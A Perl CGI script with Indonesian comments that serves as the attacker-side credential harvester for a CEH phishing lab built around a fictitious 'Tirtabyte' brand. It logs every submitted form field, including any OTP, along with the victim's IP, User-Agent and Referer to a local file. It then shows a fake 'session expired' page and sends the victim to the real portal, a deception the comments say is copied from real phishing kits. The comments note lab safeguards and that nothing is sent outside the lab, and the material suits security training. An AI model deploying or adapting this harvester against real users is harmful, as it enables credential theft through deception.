#!/usr/bin/perl
# ---------------------------------------------------------------------------
# Pemanen kredensial untuk lab CEH 04, sisi PENYERANG (container "phish").
#
# Batas etika yang dipagar di berkas ini, bukan cuma di README:
#   1. Merek yang dipakai fiktif (Tirtabyte, domain .example).
#   2. Berkas ini tidak mengirim apa pun ke mana pun. Tidak ada soket keluar,
#      tidak ada SMTP, tidak ada webhook. Hasil panen cuma ditulis ke berkas
#      lokal di dalam volume lab, dan volume itu ikut terhapus oleh
#      "./lab down 04".
#   3. Jaringan lab internal, jadi walaupun kode ini diubah supaya mengirim
#      keluar, paketnya mati di tabel rute.
#
# Yang dicatat sengaja dibuat sama dengan yang dicatat kit phishing sungguhan:
# waktu, alamat asal, User-Agent, Referer, dan SEMUA field formulir apa pun
# namanya. Itu supaya peserta yang menambah field OTP di tantangan tambahan
# tidak perlu menyentuh berkas ini lagi.
# ---------------------------------------------------------------------------
use strict;
use warnings;
use POSIX qw(strftime);

my $LOG = '/tangkapan/kredensial.log';

sub urldecode {
    my ($s) = @_;
    return '' unless defined $s;
    $s =~ tr/+/ /;
    $s =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/ge;
    return $s;
}

# Buang karakter kendali dan pemisah, supaya satu tangkapan tetap satu baris
# dan tidak ada yang bisa menyuntikkan baris palsu ke dalam catatan.
sub bersih {
    my ($s) = @_;
    return '' unless defined $s;
    $s =~ s/[\x00-\x1f\x7f]/./g;
    $s =~ s/\|/_/g;
    return $s;
}

sub html_aman {
    my ($s) = @_;
    return '' unless defined $s;
    $s =~ s/&/&amp;/g;
    $s =~ s/</&lt;/g;
    $s =~ s/>/&gt;/g;
    $s =~ s/"/&quot;/g;
    return $s;
}

my $metode = $ENV{REQUEST_METHOD} || 'GET';
my $body   = '';
if ($metode eq 'POST') {
    my $len = $ENV{CONTENT_LENGTH} || 0;
    $len = 65536 if $len > 65536;
    read(STDIN, $body, $len) if $len > 0;
}

my @urutan;
my %field;
for my $pasangan (split /&/, $body) {
    next unless length $pasangan;
    my ($k, $v) = split /=/, $pasangan, 2;
    $k = urldecode($k);
    $v = urldecode($v);
    next unless length $k;
    push @urutan, $k unless exists $field{$k};
    $field{$k} = $v;
}

print "Content-Type: text/html; charset=utf-8\r\n";
print "Cache-Control: no-store\r\n";
print "\r\n";

if ($metode ne 'POST') {
    print <<'KOSONG';
<!doctype html><html lang="id"><head><meta charset="utf-8">
<title>Pemanen</title></head><body style="font-family:sans-serif;padding:24px">
<h1>Tidak ada data</h1>
<p>Titik ini cuma menerima POST dari formulir halaman umpan.
Buka <a href="/cgi-bin/panen.cgi">/cgi-bin/panen.cgi</a> untuk melihat hasil panen.</p>
</body></html>
KOSONG
    exit 0;
}

my $waktu = strftime('%Y-%m-%dT%H:%M:%S', localtime());
my $ip    = bersih($ENV{REMOTE_ADDR}     || '-');
my $ua    = bersih($ENV{HTTP_USER_AGENT} || '-');
my $ref   = bersih($ENV{HTTP_REFERER}    || '-');
my $isi   = join('; ', map { bersih($_) . '=' . bersih($field{$_}) } @urutan);
$isi = '(formulir kosong)' unless length $isi;

if (open(my $fh, '>>', $LOG)) {
    print {$fh} "$waktu | ip=$ip | ua=$ua | referer=$ref | $isi\n";
    close($fh);
} else {
    print "<p style=\"color:#b00\">Catatan gagal ditulis ke $LOG: $!</p>\n";
}

# Balasan yang dipakai kit phishing sungguhan: bilang sesinya kedaluwarsa,
# lalu lempar korban ke portal ASLI. Korban masuk dengan normal di percobaan
# kedua dan menyimpulkan dirinya salah ketik, bukan tertipu.
my $pengguna = html_aman($field{pengguna} || $field{username} || $field{user} || '');
$pengguna = '(kosong)' unless length $pengguna;
print <<"SELESAI";
<!doctype html><html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sesi berakhir</title></head>
<body style="font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;background:#eef2f6;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center">
<div style="background:#fff;border:1px solid #d7dee7;border-radius:10px;padding:28px;width:400px;max-width:92vw">
<h1 style="font-size:19px;margin:0 0 10px">Sesi Anda berakhir</h1>
<p style="font-size:14px;color:#42505f;line-height:1.6">Silakan masuk kembali melalui portal untuk melanjutkan.</p>
<p style="font-size:14px"><a href="http://localhost:8400/">Kembali ke Tirtabyte Connect</a></p>
<hr style="border:0;border-top:1px solid #e6ebf1;margin:20px 0">
<p style="font-size:12px;color:#8794a3;line-height:1.6">
Halaman ini bagian dari lab CEH. Yang baru saja terjadi: nama pengguna
<b>$pengguna</b> beserta seluruh isi formulir
sudah tercatat di sisi penyerang. Lihat hasilnya di
<a href="/cgi-bin/panen.cgi">/cgi-bin/panen.cgi</a>.
</p>
</div></body></html>
SELESAI
